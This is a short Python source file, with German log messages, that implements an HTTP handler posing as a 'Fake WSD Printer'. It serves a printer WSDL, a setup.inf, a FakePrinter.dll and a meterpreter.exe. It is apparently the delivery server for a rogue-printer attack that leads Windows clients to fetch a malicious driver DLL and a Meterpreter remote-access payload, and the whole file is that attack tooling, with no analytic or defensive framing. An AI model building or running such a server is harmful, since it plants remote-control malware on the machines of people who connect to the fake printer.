from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse
import os

class SimpleWSDHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[GET] Anfrage empfangen: {self.path}")
        parsed_path = urlparse(self.path).path
        if parsed_path.startswith("/wsd/printer.wsdl"):
            self._send_static_file("wsd/printer.wsdl", "text/xml")
        elif parsed_path.startswith("/wsd/setup.inf"):
            self._send_static_file("wsd/setup.inf", "text/plain")
        elif parsed_path.startswith("/wsd/meterpreter.exe"):
            self._send_static_file("wsd/meterpreter.exe", "application/octet-stream")
        elif parsed_path.startswith("/wsd/FakePrinter.dll"):
            self._send_static_file("wsd/FakePrinter.dll", "application/octet-stream")
        elif parsed_path.startswith("/wsd/device"):
            response = "<html><body><h1>Fake WSD Printer</h1></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(response.encode())))
            self.end_headers()
            self.wfile.write(response.encode())
        else:
            self.send_error(404, "Not Found")

    def _send_static_file(self, relative_path, content_type):
        full_path = os.path.join(os.getcwd(), relative_path)
        if os.path.exists(full_path):
            with open(full_path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_error(404, "Datei nicht gefunden")
